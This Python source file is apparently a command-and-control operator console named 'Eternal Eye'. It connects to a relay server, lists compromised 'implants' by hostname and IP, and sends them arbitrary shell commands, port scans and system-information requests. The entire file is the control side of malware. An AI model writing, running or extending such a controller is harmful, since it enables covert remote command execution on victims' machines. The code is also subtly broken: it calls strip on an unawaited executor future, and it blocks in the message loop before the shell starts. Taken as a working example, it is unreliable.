#!/usr/bin/env python3
import asyncio
import json
import time
import websockets
from typing import Dict

class EternalEyeController:
    def __init__(self, relay_host, relay_port=8766):
        self.relay_host = relay_host
        self.relay_port = relay_port
        self.websocket = None
        self.active_implants: Dict[str, dict] = {}
        self.current_implant = None
        
    async def connect_to_relay(self):
        print(f"Connecting to {self.relay_host}:{self.relay_port}...")
        self.websocket = await websockets.connect(
            f"ws://{self.relay_host}:{self.relay_port}"
        )
        
        print("✓ Connected to Eternal Eye relay")
        await self.listen_for_messages()
        
    async def listen_for_messages(self):
        async for message in self.websocket:
            await self.process_message(message)
            
    async def process_message(self, message):
        data = json.loads(message)
        
        if data.get('type') == 'implant_list':
            self.active_implants = {imp['id']: imp for imp in data['implants']}
            self.show_implant_list()
        elif data.get('type') == 'implant_online':
            implant_id = data['implant_id']
            self.active_implants[implant_id] = data['data']
            print(f"\n[+] New implant online: {implant_id}")
        elif data.get('type') == 'response':
            self.show_command_response(data)
            
    async def send_command(self, implant_id, command_type, **kwargs):
        command = {
            'type': command_type,
            'implant_id': implant_id,
            'command_id': f"cmd_{int(time.time())}",
            **kwargs
        }
        
        await self.websocket.send(json.dumps(command))
        print(f"[→] Command sent to {implant_id}")
        
    def show_implant_list(self):
        print("\n" + "="*50)
        print("ACTIVE IMPLANTS")
        print("="*50)
        
        if not self.active_implants:
            print("No implants connected")
            return
            
        for i, (implant_id, info) in enumerate(self.active_implants.items(), 1):
            print(f"{i}. {implant_id}")
            print(f"   Hostname: {info.get('hostname', 'Unknown')}")
            print(f"   IP: {info.get('ip_address', 'Unknown')}")
            print()
            
    def show_command_response(self, response):
        print(f"\n[←] Command Response:")
        if 'error' in response:
            print(f"   ERROR: {response['error']}")
        else:
            result = response.get('result', {})
            if 'stdout' in result and result['stdout']:
                print("   STDOUT:")
                for line in result['stdout'].split('\n'):
                    if line.strip():
                        print(f"   {line}")
            if 'stderr' in result and result['stderr']:
                print("   STDERR:")
                for line in result['stderr'].split('\n'):
                    if line.strip():
                        print(f"   {line}")
            if 'open_ports' in result:
                print(f"   Open ports: {result['open_ports']}")
            if 'platform' in result:
                print(f"   Platform: {result['platform']}")
                
    async def interactive_shell(self):
        commands = {
            'list': 'Show available implants',
            'use <id>': 'Select implant for commands',
            'exec <command>': 'Execute system command',
            'scan <target>': 'Port scan target',
            'info': 'Get system information',
            'help': 'Show this help',
            'exit': 'Exit controller'
        }
        
        print("Eternal Eye Controller - Type 'help' for commands")
        
        while True:
            try:
                if self.current_implant:
                    prompt = f"ee/{self.current_implant}> "
                else:
                    prompt = "ee> "
                    
                user_input = await asyncio.get_event_loop().run_in_executor(
                    None, input, prompt
                ).strip()
                
                if not user_input:
                    continue
                    
                parts = user_input.split()
                command = parts[0].lower()
                
                if command == 'exit':
                    break
                elif command == 'help':
                    self.show_help(commands)
                elif command == 'list':
                    await self.websocket.send(json.dumps({'type': 'get_implants'}))
                elif command == 'use' and len(parts) > 1:
                    await self.select_implant(parts[1])
                elif command == 'exec' and self.current_implant:
                    cmd = ' '.join(parts[1:])
                    await self.send_command(self.current_implant, 'exec', command=cmd)
                elif command == 'scan' and len(parts) > 1 and self.current_implant:
                    await self.send_command(self.current_implant, 'port_scan', target=parts[1])
                elif command == 'info' and self.current_implant:
                    await self.send_command(self.current_implant, 'system_info')
                else:
                    print("Unknown command or no implant selected. Use 'list' and 'use <id>'")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"Error: {e}")
                
    def show_help(self, commands):
        print("\nAvailable Commands:")
        for cmd, desc in commands.items():
            print(f"  {cmd:15} {desc}")
        print()
        
    async def select_implant(self, implant_identifier):
        # Try by index
        try:
            index = int(implant_identifier) - 1
            implant_ids = list(self.active_implants.keys())
            if 0 <= index < len(implant_ids):
                self.current_implant = implant_ids[index]
                print(f"[+] Using implant: {self.current_implant}")
                return
        except (ValueError, IndexError):
            pass
            
        # Try by implant ID
        if implant_identifier in self.active_implants:
            self.current_implant = implant_identifier
            print(f"[+] Using implant: {self.current_implant}")
        else:
            print("[-] Invalid implant identifier")
            
    async def run(self):
        await self.connect_to_relay()
        await self.interactive_shell()

async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Eternal Eye Controller')
    parser.add_argument('--relay', required=True, help='Relay server hostname/IP')
    parser.add_argument('--port', type=int, default=8766, help='Relay server port')
    
    args = parser.parse_args()
    
    controller = EternalEyeController(args.relay, args.port)
    await controller.run()

if __name__ == "__main__":
    asyncio.run(main())
